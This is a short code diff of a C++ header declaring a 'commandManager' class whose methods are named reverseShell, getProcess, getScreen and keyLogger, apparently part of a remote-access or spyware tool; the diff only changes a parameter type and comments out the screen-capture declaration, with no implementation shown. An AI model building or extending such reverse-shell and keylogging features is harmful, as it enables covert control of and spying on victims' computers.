@@ -6,9 +6,9 @@ class commandManager
 
 public:
 	commandManager();
-	std::string reverseShell(const char* cmd);
+	std::string reverseShell(std::string cmd);
 	void getProcess();
-	bool getScreen(LPCSTR fname);
+	//bool getScreen(LPCSTR fname);
 	void keyLogger();
 };
 
